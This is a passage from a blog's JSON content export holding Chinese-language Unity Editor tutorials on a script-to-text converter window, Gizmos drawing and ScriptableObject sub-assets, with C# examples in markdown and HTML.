resWidthN, resHeightN, System.DateTime.Now.ToString(&quot;yyyy-mm-dd_HH-mm-ss&quot;));\n    System.IO.File.WriteAllBytes(lastPath, bytes);\n    Application.OpenURL(lastPath);//打开图片\n    AssetDatabase.Refresh(); \n}</code></pre><p>}</p>\n<pre><code>* 4:</code></pre><p>using System.Collections;<br>using System.Collections.Generic;<br>using UnityEngine;<br>using UnityEditor;<br>using System.IO;</p>\n<p>public class ScriptToText : EditorWindow<br>{<br>    [MenuItem(“Tools/脚本与文件互转”)]<br>    static void ShowScriptToTextWindow()<br>    {<br>        GetWindow<ScriptToText>(“脚本与文件互转”);<br>    }</ScriptToText></p>\n<pre><code>private void OnGUI()\n{\n    //整个窗口为水平布局\n    GUILayout.BeginHorizontal();\n    DrawLeft();\n    //GUILayout.Label(&quot;|&quot;, GUILayout.MinHeight(10000));\n    DrawRight();\n    GUILayout.EndHorizontal();\n}\n\nprivate string scriptsContext = &quot;&quot;;\nprivate Vector2 scrollposition;\n\n/// &lt;summary&gt;\n/// 绘制左边的区域\n/// &lt;/summary&gt;\nprivate void DrawLeft()\n{\n    //局部为垂直窗口区域\n    GUILayout.BeginVertical();\n    GUILayout.Label(&quot;显示脚本中的所有内容:&quot;);\n    //开始滑动的区域\n    scrollposition = GUILayout.BeginScrollView(scrollposition);\n\n    //绘制文本\n    scriptsContext = GUILayout.TextArea(scriptsContext, GUILayout.ExpandHeight(true));//动态高度,会占满\n\n    GUILayout.EndScrollView();\n    GUILayout.EndVertical();\n}\n\n//文件资源对象\nTextAsset textAssetObject;\n//脚本资源对象\nTextAsset scriptAssetObject;\n\n//文件保存的路径\nstring saveFilePath = &quot;&quot;;\n//脚本保存的路径\nstring scriptFilePath = &quot;&quot;;\n\n//绘制2D图像\nTexture2D texture2D;\n\nprivate void DrawRight()\n{\n    //局部为垂直窗口区域\n    GUILayout.BeginVertical();\n    {\n\n        textAssetObject = (TextAsset)EditorGUILayout.ObjectField(&quot;script转txt&quot;, textAssetObject, typeof(TextAsset), true);\n        EditorGUILayout.LabelField(&quot;被保存在    &quot; + saveFilePath + &quot;/&quot; + &quot;    路径下面&quot;);\n        //绘制Text字段，用户获取用户指定的路径\n        if (GUILayout.Button(&quot;选择txt保存的路径&quot;))\n        {\n            saveFilePath = EditorUtility.SaveFolderPanel(&quot;Path to Save Images&quot;, saveFilePath, Application.dataPath);\n        }\n        if (GUILayout.Button(&quot;script保存为txt&quot;))\n        {\n            //执行这个方法\n            SaveFile(&quot;.txt&quot;);\n        }\n        if (textAssetObject!=null &amp;&amp; !textAssetObject.text.Equals(&quot;&quot;))\n        {\n            scriptsContext = textAssetObject.text;\n        }\n    }\n    GUILayout.Space(40);\n    {\n\n        scriptAssetObject = (TextAsset)EditorGUILayout.ObjectField(&quot;txt转script&quot;, scriptAssetObject, typeof(TextAsset), true);\n        EditorGUILayout.LabelField(&quot;被保存在    &quot; + saveFilePath + &quot;/&quot; + &quot;    路径下面&quot;);\n        //绘制Text字段，用户获取用户指定的路径\n        if (GUILayout.Button(&quot;选择脚本保存的路径&quot;))\n        {\n            saveFilePath = EditorUtility.SaveFolderPanel(&quot;Path to Save Images&quot;, saveFilePath, Application.dataPath);\n        }\n        if (GUILayout.Button(&quot;txt保存为script&quot;))\n        {\n            //执行这个方法\n            SaveFile(&quot;.cs&quot;);\n        }\n        if (scriptAssetObject != null &amp;&amp; !scriptAssetObject.text.Equals(&quot;&quot;))\n        {\n            scriptsContext = textAssetObject.text;\n        }\n    }\n    GUILayout.Space(40);\n    {\n        Texture2D texture2D = AssetDatabase.LoadAssetAtPath(&quot;Assets/Texture/Battleground_bg.png&quot;, typeof(Texture2D)) as Texture2D;\n        GUI.DrawTexture(GUILayoutUtility.GetRect(500, 300), texture2D);\n    }\n    GUILayout.EndVertical();\n}\n\n//默认文件保存路径\nprivate const string defaultFilePath = &quot;Assets/TextFiles/&quot;;\n\n//默认脚本保存路径\nprivate const string defaultScriptPath = &quot;Assets/Scripts/&quot;;\n\n/// &lt;summary&gt;\n/// 脚本转换为文本\n/// &lt;/summary&gt;\nvoid SaveFile(string suffix)\n{\n    string path = defaultFilePath;\n    if (!saveFilePath.Equals(&quot;&quot;))\n    {\n        path = saveFilePath;\n    }\n    if (!Directory.Exists(path))\n    {\n        Directory.CreateDirectory(path);\n    }\n    //写入文件\n    StreamWriter sw = new StreamWriter(defaultFilePath + textAssetObject.name + suffix);\n    sw.Write(textAssetObject.text);\n    sw.Close();\n    AssetDatabase.Refresh();\n}</code></pre><p>}</p>\n<p>```</p>\n"},{"title":"13 简单Node","date":"2020-05-11T03:41:32.000Z","top":13,"_content":"# 简单的节点编辑器\n\n* 1:","source":"_posts/Unity/UnityEditor/13 简单Node.md","raw":"---\ntitle: 13 简单Node\ndate: 2020-05-11 11:41:32\ntop: 13\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n# 简单的节点编辑器\n\n* 1:","slug":"Unity/UnityEditor/13 简单Node","published":1,"updated":"2020-05-15T02:50:44.126Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0p004w2gk7c2pd33kr","content":"<h1 id=\"简单的节点编辑器\"><a href=\"#简单的节点编辑器\" class=\"headerlink\" title=\"简单的节点编辑器\"></a>简单的节点编辑器</h1><ul>\n<li>1:</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"简单的节点编辑器\"><a href=\"#简单的节点编辑器\" class=\"headerlink\" title=\"简单的节点编辑器\"></a>简单的节点编辑器</h1><ul>\n<li>1:</li>\n</ul>\n"},{"title":"12 Gizmos","date":"2020-05-11T03:41:32.000Z","top":12,"_content":"# Gizmos\n\n* 1:创建 Gizmos文件夹,可以在Scene视图中做一个预览的线,展示摄像机轨迹,即辅助线框\n所有Gizmos的绘制必须在脚本的OnDrawGizmos或OnDrawGizmosSelected里编写,必须于Scene视图下，于Game视图下不起作用;\n使用Gizmos.DrawIcon(transform.position, \"0.png\", true), 可以在Scene视图里给某个坐标绘制一个icon。\n它的好处是可以传一个Vecotor3 作为图片显示的位置。 参数2就是图片的名字，当然这个图片必须放在Gizmos文件夹下面。\n * 2:\n ```\nusing System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\n\npublic class GizmosScript : MonoBehaviour\n{\n    [SerializeField]\n    float areaRadius;\n\n    [SerializeField]\n    float size;\n\n    [SerializeField]\n    Vector3[] nodePoints;\n    private void OnDrawGizmos()\n    {\n        Gizmos.color = Color.yellow;\n        //绘制线框球体第一个参数就是起点的位置，第二个参数就是半径。 \n        Gizmos.DrawWireSphere(this.transform.localPosition, areaRadius);\n        Gizmos.color = Color.cyan;\n\n        //第一个参数就是起点的位置，第二个参数就是指定的位置。 \n        Gizmos.DrawLine(this.transform.localPosition, transform.position + transform.forward * size);\n\n        for (int i = 0; i < nodePoints?.Length; i++)\n        {\n            Gizmos.color = Color.blue;\n            Gizmos.DrawSphere(nodePoints[i], areaRadius);\n            Gizmos.color = Color.red;\n            Gizmos.DrawLine(nodePoints[i], nodePoints[(int)Mathf.Repeat(i+1,nodePoints.Length)]);\n        }\n        Gizmos.DrawIcon(this.transform.position, \"heart\");\n    }\n\n    private void OnDrawGizmosSelected()\n    {\n    }\n}\n\n ```","source":"_posts/Unity/UnityEditor/12 Gizmos.md","raw":"---\ntitle: 12 Gizmos\ndate: 2020-05-11 11:41:32\ntop: 12\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n# Gizmos\n\n* 1:创建 Gizmos文件夹,可以在Scene视图中做一个预览的线,展示摄像机轨迹,即辅助线框\n所有Gizmos的绘制必须在脚本的OnDrawGizmos或OnDrawGizmosSelected里编写,必须于Scene视图下，于Game视图下不起作用;\n使用Gizmos.DrawIcon(transform.position, \"0.png\", true), 可以在Scene视图里给某个坐标绘制一个icon。\n它的好处是可以传一个Vecotor3 作为图片显示的位置。 参数2就是图片的名字，当然这个图片必须放在Gizmos文件夹下面。\n * 2:\n ```\nusing System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\n\npublic class GizmosScript : MonoBehaviour\n{\n    [SerializeField]\n    float areaRadius;\n\n    [SerializeField]\n    float size;\n\n    [SerializeField]\n    Vector3[] nodePoints;\n    private void OnDrawGizmos()\n    {\n        Gizmos.color = Color.yellow;\n        //绘制线框球体第一个参数就是起点的位置，第二个参数就是半径。 \n        Gizmos.DrawWireSphere(this.transform.localPosition, areaRadius);\n        Gizmos.color = Color.cyan;\n\n        //第一个参数就是起点的位置，第二个参数就是指定的位置。 \n        Gizmos.DrawLine(this.transform.localPosition, transform.position + transform.forward * size);\n\n        for (int i = 0; i < nodePoints?.Length; i++)\n        {\n            Gizmos.color = Color.blue;\n            Gizmos.DrawSphere(nodePoints[i], areaRadius);\n            Gizmos.color = Color.red;\n            Gizmos.DrawLine(nodePoints[i], nodePoints[(int)Mathf.Repeat(i+1,nodePoints.Length)]);\n        }\n        Gizmos.DrawIcon(this.transform.position, \"heart\");\n    }\n\n    private void OnDrawGizmosSelected()\n    {\n    }\n}\n\n ```","slug":"Unity/UnityEditor/12 Gizmos","published":1,"updated":"2020-05-15T02:50:40.997Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0t00502gk7hikr59re","content":"<h1 id=\"Gizmos\"><a href=\"#Gizmos\" class=\"headerlink\" title=\"Gizmos\"></a>Gizmos</h1><ul>\n<li>1:创建 Gizmos文件夹,可以在Scene视图中做一个预览的线,展示摄像机轨迹,即辅助线框<br>所有Gizmos的绘制必须在脚本的OnDrawGizmos或OnDrawGizmosSelected里编写,必须于Scene视图下，于Game视图下不起作用;<br>使用Gizmos.DrawIcon(transform.position, “0.png”, true), 可以在Scene视图里给某个坐标绘制一个icon。<br>它的好处是可以传一个Vecotor3 作为图片显示的位置。 参数2就是图片的名字，当然这个图片必须放在Gizmos文件夹下面。<ul>\n<li>2:<pre><code>using System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\n</code></pre></li>\n</ul>\n</li>\n</ul>\n<p>public class GizmosScript : MonoBehaviour<br>{<br>    [SerializeField]<br>    float areaRadius;</p>\n<pre><code>[SerializeField]\nfloat size;\n\n[SerializeField]\nVector3[] nodePoints;\nprivate void OnDrawGizmos()\n{\n    Gizmos.color = Color.yellow;\n    //绘制线框球体第一个参数就是起点的位置，第二个参数就是半径。 \n    Gizmos.DrawWireSphere(this.transform.localPosition, areaRadius);\n    Gizmos.color = Color.cyan;\n\n    //第一个参数就是起点的位置，第二个参数就是指定的位置。 \n    Gizmos.DrawLine(this.transform.localPosition, transform.position + transform.forward * size);\n\n    for (int i = 0; i &lt; nodePoints?.Length; i++)\n    {\n        Gizmos.color = Color.blue;\n        Gizmos.DrawSphere(nodePoints[i], areaRadius);\n        Gizmos.color = Color.red;\n        Gizmos.DrawLine(nodePoints[i], nodePoints[(int)Mathf.Repeat(i+1,nodePoints.Length)]);\n    }\n    Gizmos.DrawIcon(this.transform.position, &quot;heart&quot;);\n}\n\nprivate void OnDrawGizmosSelected()\n{\n}</code></pre><p>}</p>\n<p> ```</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Gizmos\"><a href=\"#Gizmos\" class=\"headerlink\" title=\"Gizmos\"></a>Gizmos</h1><ul>\n<li>1:创建 Gizmos文件夹,可以在Scene视图中做一个预览的线,展示摄像机轨迹,即辅助线框<br>所有Gizmos的绘制必须在脚本的OnDrawGizmos或OnDrawGizmosSelected里编写,必须于Scene视图下，于Game视图下不起作用;<br>使用Gizmos.DrawIcon(transform.position, “0.png”, true), 可以在Scene视图里给某个坐标绘制一个icon。<br>它的好处是可以传一个Vecotor3 作为图片显示的位置。 参数2就是图片的名字，当然这个图片必须放在Gizmos文件夹下面。<ul>\n<li>2:<pre><code>using System.Collections;\nusing System.Collections.Generic;\nusing UnityEngine;\n</code></pre></li>\n</ul>\n</li>\n</ul>\n<p>public class GizmosScript : MonoBehaviour<br>{<br>    [SerializeField]<br>    float areaRadius;</p>\n<pre><code>[SerializeField]\nfloat size;\n\n[SerializeField]\nVector3[] nodePoints;\nprivate void OnDrawGizmos()\n{\n    Gizmos.color = Color.yellow;\n    //绘制线框球体第一个参数就是起点的位置，第二个参数就是半径。 \n    Gizmos.DrawWireSphere(this.transform.localPosition, areaRadius);\n    Gizmos.color = Color.cyan;\n\n    //第一个参数就是起点的位置，第二个参数就是指定的位置。 \n    Gizmos.DrawLine(this.transform.localPosition, transform.position + transform.forward * size);\n\n    for (int i = 0; i &lt; nodePoints?.Length; i++)\n    {\n        Gizmos.color = Color.blue;\n        Gizmos.DrawSphere(nodePoints[i], areaRadius);\n        Gizmos.color = Color.red;\n        Gizmos.DrawLine(nodePoints[i], nodePoints[(int)Mathf.Repeat(i+1,nodePoints.Length)]);\n    }\n    Gizmos.DrawIcon(this.transform.position, &quot;heart&quot;);\n}\n\nprivate void OnDrawGizmosSelected()\n{\n}</code></pre><p>}</p>\n<p> ```</p>\n"},{"title":"3 数据交互","date":"2020-05-11T03:41:32.000Z","top":3,"_content":"# unityEditor 简单数据交互\n\n* 1:EditorPrefs,轻易不要使用,出问题不负责,类似于PlayerPrefs,键值对存储 F12 查API就行了,项目中一般用不到\n* 2:EditorUserSettings.Set/GetConfigValue方法,键值对存储,二进制数据\n* 3:JsonUtility & EditorJsonUtility 一般不用使用其他第三方库替代,例如Litjson newjsonxxx(最新的那个库,忘了)\n# unityEditor ScriptableObject常用数据资产\n* 1:ScriptableObject,作为编辑器,文件,数据,运行时的数据库使用,范围大,常用方式,在Project的Assets文件夹以下都可以。如果是编辑器扩展专用的ScriptableObject，最好制作在Editor文件夹以下。\n\n```\n    using UnityEngine;\n    using UnityEditor;\n    public class NewBehaviourScript : ScriptableObject\n    {\n        [Range(0,10)]\n        public int number = 3;\n\n        public bool toggle = false;\n\n        public string[] texts = new string[5];\n    }\n```\n* 2: EditorWindow 继承自 ScriptableObject\n制作继承自ScriptableObject的一个例子资源,保存在一个路径下面,\nCreateAssetMenu可以在Project里面右键快速创建\n\n```\n    using UnityEngine;\n    using UnityEditor;\n\n    [CreateAssetMenu(menuName = \"Tools/Create ExampleAsset Instance\")]\n    public class ExampleAsset : ScriptableObject\n    {\n\n        [MenuItem(\"Tools/Create ExampleAsset\")]\n        static void CreateExampleAsset()\n        {\n            var exampleAsset = CreateInstance<ExampleAsset>();\n\n            AssetDatabase.CreateAsset(exampleAsset, \"Assets/Editor/ExampleAsset.asset\");\n            AssetDatabase.Refresh();\n        }\n    }\n```\n\n使用以下方法读取数据:\n```\n var exampleAsset =AssetDatabase.LoadAssetAtPath<ExampleAsset>(\"Assets/Editor/ExampleAsset.asset\");\n ```\n 如何展现属性值并且可以修改:直接类似于MonoBehaviour一样写上 [SerializeField] 标签即可\n\n\n* 3: 如何表现ScriptableObject的父子关系\n\n```\n    using UnityEngine;\n\n    public class ParentScriptableObject : ScriptableObject\n    {\n        [SerializeField]\n        ChildScriptableObject child;\n    }\n\n    public class ChildScriptableObject : ScriptableObject\n    {\n        [SerializeField]\n        string str;\n\n        public ChildScriptableObject ()\n        {\n            name = \"New ChildScriptableObject\";\n        }\n    }\n\n保存成一个asset数据:\n    using UnityEngine;\n    using UnityEditor;\n\n    public class ParentScriptableObject : ScriptableObject\n    {\n        const string PATH = \"Assets/Editor/New ParentScriptableObject.asset\";\n        [SerializeField]\n        ChildScriptableObject child;\n\n        [MenuItem (\"Assets/Create ScriptableObject\")]\n        static void CreateScriptableObject ()\n        {\n            var parent = ScriptableObject.CreateInstance<ParentScriptableObject> ();\n            parent.child = ScriptableObject.CreateInstance<ChildScriptableObject> ();\n            //这个地方如果直接使用的话再次重启unity,就会丢失子类数据,需要先将子类数据保存成一个asset,\n            //再将父类的属性child指向子类保存的asset.这样重启unity就不会丢失数据了,\n            //这样是可以使用,但是比较麻烦\n            //使用AddObjectToAsset可以生成资产父子关系\n            AssetDatabase.AddObjectToAsset (parent.child, PATH);\n            //使子资产不可见,再外部\n            parent.child.hideFlags = HideFlags.HideInHierarchy;\n            AssetDatabase.CreateAsset (parent, PATH);\n            AssetDatabase.ImportAsset(PATH);\n        }\n    }\n ```\n\n ``` \n    static void SetHideFlags ()\n    {\n        var path = AssetDatabase.GetAssetPath (Selection.activeObject);\n        //显示子资产\n        foreach (var item in AssetDatabase.LoadAllAssetsAtPath(path)) {\n            item.hideFlags = HideFlags.None;\n        }\n        AssetDatabase.ImportAsset (path);\n    }\n ```\n\n ```\n    var parent = AssetDatabase.LoadAssetAtPath<ParentScriptableObject> (PATH);\n    //删除子资产\n    Object.DestroyImmediate (parent.child, true);\n    parent.child = null;\n    AssetDatabase.ImportAsset (PATH);\n ```\n\n * 4:在Inspector面板上面展示数组\n```\n    SerializedProperty property = serializedObject.FindProperty(\"nodePoints\");\n    EditorGUI.BeginChangeCheck();\n    EditorGUILayout.PropertyField(property, new GUIContent(\"位置节点\"), true);\n    if (EditorGUI.EndChangeCheck())\n    {\n        serializedObject.ApplyModifiedProperties();\n    }\n```","source":"_posts/Unity/UnityEditor/3 数据交互.md","raw":"---\ntitle: 3 数据交互\ndate: 2020-05-11 11:41:32\ntop: 3\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n# unityEditor 简单数据交互\n\n* 1:EditorPrefs,轻易不要使用,出问题不负责,类似于PlayerPrefs,键值对存储 F12 查API就行了,项目中一般用不到\n* 2:EditorUserSettings.Set/GetConfigValue方法,键值对存储,二进制数据\n* 3:JsonUtility & EditorJsonUtility 一般不用使用其他第三方库替代,例如Litjson newjsonxxx(最新的那个库,忘了)\n# unityEditor ScriptableObject常用数据资产\n* 1:ScriptableObject,作为编辑器,文件,数据,运行时的数据库使用,范围大,常用方式,在Project的Assets文件夹以下都可以。如果是编辑器扩展专用的ScriptableObject，最好制作在Editor文件夹以下。\n\n```\n    using UnityEngine;\n    using UnityEditor;\n    public class NewBehaviourScript : ScriptableObject\n    {\n        [Range(0,10)]\n        public int number = 3;\n\n        public bool toggle = false;\n\n        public string[] texts = new string[5];\n    }\n```\n* 2: EditorWindow 继承自 ScriptableObject\n制作继承自ScriptableObject的一个例子资源,保存在一个路径下面,\nCreateAssetMenu可以在Project里面右键快速创建\n\n```\n    using UnityEngine;\n    using UnityEditor;\n\n    [CreateAssetMenu(menuName = \"Tools/Create ExampleAsset Instance\")]\n    public class ExampleAsset : ScriptableObject\n    {\n\n        [MenuItem(\"Tools/Create ExampleAsset\")]\n        static void CreateExampleAsset()\n        {\n            var exampleAsset = CreateInstance<ExampleAsset>();\n\n            AssetDatabase.CreateAsset(exampleAsset, \"Assets/Editor/ExampleAsset.asset\");\n            AssetDatabase.Refresh();\n        }\n    }\n```\n\n使用以下方法读取数据:\n```\n var exampleAsset =AssetDatabase.LoadAssetAtPath<ExampleAsset>(\"Assets/Editor/ExampleAsset.asset\");\n ```\n 如何展现属性值并且可以修改:直接类似于MonoBehaviour一样写上 [SerializeField] 标签即可\n\n\n* 3: 如何表现ScriptableObject的父子关系\n\n```\n    using UnityEngine;\n\n    public class ParentScriptableObject : ScriptableObject\n    {\n        [SerializeField]\n        ChildScriptableObject child;\n    }\n\n    public class ChildScriptableObject : ScriptableObject\n    {\n        [SerializeField]\n        string str;\n\n        public ChildScriptableObject ()\n        {\n            name = \"New ChildScriptableObject\";\n        }\n    }\n\n保存成一个asset数据:\n    using UnityEngine;\n    using UnityEditor;\n\n    public class ParentScriptableObject : ScriptableObject\n    {\n        const string PATH = \"Assets/Editor/New ParentScriptableObject.asset\";\n        [SerializeField]\n        ChildScriptableObject child;\n\n        [MenuItem (\"Assets/Create ScriptableObject\")]\n        static void CreateScriptableObject ()\n        {\n            var parent = ScriptableObject.CreateInstance<ParentScriptableObject> ();\n            parent.child = ScriptableObject.CreateInstance<ChildScriptableObject> ();\n            //这个地方如果直接使用的话再次重启unity,就会丢失子类数据,需要先将子类数据保存成一个asset,\n            //再将父类的属性child指向子类保存的asset.这样重启unity就不会丢失数据了,\n            //这样是可以使用,但是比较麻烦\n            //使用AddObjectToAsset可以生成资产父子关系\n            AssetDatabase.AddObjectToAsset (parent.child, PATH);\n            //使子资产不可见,再外部\n            parent.child.hideFlags = HideFlags.HideInHierarchy;\n            AssetDatabase.CreateAsset (parent, PATH);\n            AssetDatabase.ImportAsset(PATH);\n        }\n    }\n ```\n\n ``` \n    static void SetHideFlags ()\n    {\n        var path = AssetDatabase.GetAssetPath (Selection.activeObject);\n        //显示子资产\n        foreach (var item in AssetDatabase.LoadAllAssetsAtPath(path)) {\n            item.hideFlags = HideFlags.None;\n        }\n        AssetDatabase.ImportAsset (path);\n    }\n ```\n\n ```\n    var parent = AssetDatabase.LoadAssetAtPath<ParentScriptableObject> (PATH);\n    //删除子资产\n    Object.DestroyImmediate (parent.child, true);\n    parent.child = null;\n    AssetDatabase.ImportAsset (PATH);\n ```\n\n * 4:在Inspector面板上面展示数组\n```\n    SerializedProperty property = serializedObject.FindProperty(\"nodePoints\");\n    EditorGUI.BeginChangeCheck();\n    EditorGUILayout.PropertyField(property, new GUIContent(\"位置节点\"), true);\n    if (EditorGUI.EndChangeCheck())\n    {\n        serializedObject.ApplyModifiedProperties();\n    }\n```","slug":"Unity/UnityEditor/3 数据交互","published":1,"updated":"2020-05-15T02:50:17.931Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0u00532gk712p67npb","content":"<h1 id=\"unityEditor-简单数据交互\"><a href=\"#unityEditor-简单数据交互\" class=\"headerlink\" title=\"unityEditor 简单数据交互\"></a>unityEditor 简单数据交互</h1><ul>\n<li>1:EditorPrefs,轻易不要使用,出问题不负责,类似于PlayerPrefs,键值对存储 F12 查API就行了,项目中一般用不到</li>\n<li>2:EditorUserSettings.Set/GetConfigValue方法,键值对存储,二进制数据</li>\n<li>3:JsonUtility &amp; EditorJsonUtility 一般不用使用其他第三方库替代,例如Litjson newjsonxxx(最新的那个库,忘了)<h1 id=\"unityEditor-ScriptableObject常用数据资产\"><a href=\"#unityEditor-ScriptableObject常用数据资产\" class=\"headerlink\" title=\"unityEditor ScriptableObject常用数据资产\"></a>unityEditor ScriptableObject常用数据资产</h1></li>\n<li>1:ScriptableObject,作为编辑器,文件,数据,运行时的数据库使用,范围大,常用方式,在Project的Assets文件夹以下都可以。如果是编辑器扩展专用的ScriptableObject，最好制作在Editor文件夹以下。</li>\n</ul>\n<pre><code>    using UnityEngine;\n    using UnityEditor;\n    public class NewBehaviourScript : ScriptableObject\n    {\n        [Range(0,10)]\n        public int number = 3;\n\n        public bool toggle = false;\n\n        public string[] texts = new string[5];\n    }</code></pre><ul>\n<li>2: EditorWindow 继承自 ScriptableObject<br>制作继承自ScriptableObject的一个例子资源,保存在一个路径下面,<br>CreateAssetMenu可以在Project里面右键快速创建</li>\n</ul>\n<pre><code>    using UnityEngine;\n    using UnityEditor;\n\n    [CreateAssetMenu(menuName = &quot;Tools/Create ExampleAsset Instance&quot;)]\n    public class ExampleAsset : ScriptableObject\n    {\n\n        [MenuItem(&quot;Tools/Create ExampleAsset&quot;)]\n        static void CreateExampleAsset()\n        {\n            var exampleAsset = CreateInstance&lt;ExampleAsset&gt;();\n\n            AssetDatabase.CreateAsset(exampleAsset, &quot;Assets/Editor/ExampleAsset.asset&quot;);\n            AssetDatabase.Refresh();\n        }\n    }</code></pre><p>使用以下方法读取数据:</p>\n<pre><code> var exampleAsset =AssetDatabase.LoadAssetAtPath&lt;ExampleAsset&gt;(&quot;Assets/Editor/ExampleAsset.asset&quot;);</code></pre><p> 如何展现属性值并且可以修改:直接类似于MonoBehaviour一样写上 [SerializeField] 标签即可</p>\n<ul>\n<li>3: 如何表现ScriptableObject的父子关系</li>\n</ul>\n<pre><code>    using UnityEngine;\n\n    public class ParentScriptableObject : ScriptableObject\n    {\n        [SerializeField]\n        ChildScriptableObject child;\n    }\n\n    public class ChildScriptableObject : ScriptableObject\n    {\n        [SerializeField]\n        string str;\n\n        public ChildScriptableObject ()\n        {\n            name = &quot;New ChildScriptableObject&quot;;\n        }\n    }\n\n保存成一个asset数据:\n    using UnityEngine;\n    using UnityEditor;\n\n    public class ParentScriptableObject : ScriptableObject\n    {\n        const string PATH = &quot;Assets/Editor/New ParentScriptableObject.asset&quot;;\n        [SerializeField]\n        ChildScriptableObject child;\n\n        [MenuItem (&quot;Assets/Create ScriptableObject&quot;)]\n        static void CreateScriptableObject ()\n        {\n            var parent = ScriptableObject.CreateInstance&lt;ParentScriptableObject&gt; ();\n            parent.child = ScriptableObject.CreateInstance&lt;ChildScriptableObject&gt; ();\n            //这个地方如果直接使用的话再次重启unity,就会丢失子类数据,需要先将子类数据保存成一个asset,\n            //再将父类的属性child指向子类保存的asset.这样重启unity就不会丢失数据了,\n            //这样是可以使用,但是比较麻烦\n            //使用AddObjectToAsset可以生成资产父子关系\n            AssetDatabase.AddObjectToAsset (parent.child, PATH);\n            //使子资产不可见,再外部\n            parent.child.hideFlags = HideFlags.HideInHierarchy;\n            AssetDatabase.CreateAsset (parent, PATH);\n            AssetDatabase.ImportAsset(PATH);\n        }\n    }</code></pre><pre><code>    static void SetHideFlags ()\n    {\n        var path = AssetDatabase.GetAssetPath (Selection.activeObject);\n        //显示子资产\n        foreach (var item in AssetDatabase.LoadAllAssetsAtPath(path)) {\n            item.hideFlags = HideFlags.None;\n        }\n        AssetDatabase.ImportAsset (path);\n    }</code></pre><pre><code>    var parent = AssetDatabase.LoadAssetAtPath&lt;ParentScriptableObject&gt; (PATH);\n    //删除子资产\n    Object.DestroyImmediate (parent.child, true);\n    parent.child = null;\n    AssetDatabase.ImportAsset (PATH);</code></pre><ul>\n<li>4:在Inspector面板上面展示数组<pre><code> SerializedProperty property = serializedObject.FindProperty(&quot;nodePoints&quot;);\n EditorGUI.BeginChangeCheck();\n EditorGUILayout.PropertyField(property, new GUIContent(&quot;位置节点&quot;), true);\n if (EditorGUI.EndChangeCheck())\n {\n     serializedObject.ApplyModifiedProperties();\n }</code></pre></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"unityEditor-简单数据交互\"><a href=\"#unityEditor-简单数据交互\" class=\"headerlink\" title=\"unityEditor 简单数据交互\"></a>unityEditor 简单数据交互</h1><ul>\n<li>1:EditorPrefs,轻易不要使用,出问题不负责,类似于PlayerPrefs,键值对存储 F12 查API就行了,项目中一般用不到</li>\n<li>2:EditorUserSettings.Set/GetConfigValue方法,键值对存储,二进制数据</li>\n<li>3:JsonUtility &amp; EditorJsonUtility 一般不用使用其他第三方库替代,例如Litjson newjsonxxx(最新的那个库,忘了)<h1 id=\"unityEditor-ScriptableObject常用数据资产\"><a href=\"#unityEditor-ScriptableObject常用数据资产\" class=\"headerlink\" title=\"unityEditor ScriptableObject常用数据资产\"></a>unityEditor ScriptableObject常用数据资产</h1></li>\n<li>1:ScriptableObject,作为编辑器,文件,数据,运行时的数据库使用,范围大,常用方式,在Project的Assets文件夹以下都可以。如果是编辑器扩展专用的ScriptableObject，最好制作在Editor文件夹以下。</li>\n</ul>\n<pre><code>    using UnityEngine;\n    using UnityEditor;\n    public class NewBehaviourScript : ScriptableObject\n    {\n        [Range(0,10)]\n        public int number = 3;\n\n        public bool toggle = false;\n\n        public string[] texts = new string[5];\n    }</code></pre><ul>\n<li>2: EditorWindow 继承自 ScriptableObject<br>制作继承自ScriptableObject的一个例子资源,保存在一个路径下面,<br>CreateAssetMenu可以在Project里面右键快速创建</li>\n</ul>\n<pre><code>    using UnityEngine;\n    using UnityEditor;\n\n    [CreateAssetMenu(menuName = &quot;Tools/Create ExampleAsset Instance&quot;)]\n    public class ExampleAsset : ScriptableObject\n    {\n\n        [MenuItem(&quot;Tools/Create ExampleAsset&quot;)]\n        static void CreateExampleAsset()\n        {\n            var exampleAsset = CreateInstance&lt;ExampleAsset&gt;();\n\n            AssetDatabase.CreateAsset(exampleAsset, &quot;Assets/Editor/ExampleAsset.asset&quot;);\n            AssetDatabase.Refresh();\n        }\n    }</code></pre><p>使用以下方法读取数据:</p>\n<pre><code> var exampleAsset =AssetDatabase.LoadAssetAtPath&lt;ExampleAsset&gt;(&quot;Assets/Editor/ExampleAsset.asset&quot;);</code></pre><p> 如何展现属性值并且可以修改:直接类似于MonoBehaviour一样写上 [SerializeField] 标签即可</p>\n<ul>\n<li>3: 如何表现ScriptableObject的父子关系</li>\n</ul>\n<pre><code>    using UnityEngine;\n\n    public class ParentScriptableObject : ScriptableObject\n    {\n        [SerializeField]\n        ChildScriptableObject child;\n    }\n\n    public class ChildScriptableObject : ScriptableObject\n    {\n        [SerializeField]\n        string str;\n\n        public ChildScriptableObject ()\n        {\n            name = &quot;New ChildScriptableObject&quot;;\n        }\n    }\n\n保存成一个asset数据:\n    using UnityEngine;\n    using UnityEditor;\n\n    public class ParentScriptableObject : ScriptableObject\n    {\n        const string PATH = &quot;Assets/Editor/New ParentScriptableObject.asset&quot;;\n        [SerializeField]\n        ChildScriptableObject child;\n\n        [MenuItem (&quot;Assets/Create ScriptableObject&quot;)]\n        static void CreateScriptableObject ()\n        {\n            var parent = ScriptableObject.CreateInstance&lt;ParentScriptableObject&gt; ();\n            parent.child = ScriptableObject.CreateInstance&lt;ChildScriptableObject&gt; ();\n            //这个地方如果直接使用的话再次重启unity,就会丢失子类数据,需要先将子类数据保存成一个asset,\n            //再将父类的属性child指向子类保存的asset.这样重启unity就不会丢失数据了,\n            //这样是可以使用,但是比较麻烦\n            //使用AddObjectToAsset可以生成资产父子关系\n            AssetDatabase.AddObjectToAsset (parent.child, PATH);\n            //使子资产不可见,再外部\n            parent.child.hideFlags = HideFlags.HideInHierarchy;\n            AssetDatabase.CreateAsset (parent, PATH);\n            AssetDatabase.ImportAsset(PATH);\n        }\n    }</code></pre><pre><code>    static void SetHideFlags ()\n    {\n        var path = 